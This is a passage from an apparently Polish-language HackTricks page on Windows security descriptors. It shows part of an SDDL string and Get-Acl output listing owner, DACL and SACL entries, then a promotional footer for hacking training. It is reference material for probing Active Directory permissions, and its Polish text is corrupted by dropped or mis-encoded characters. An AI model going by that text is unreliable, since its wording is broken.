00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Waciciel            : BUILTIN\Administrators
Grupa            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
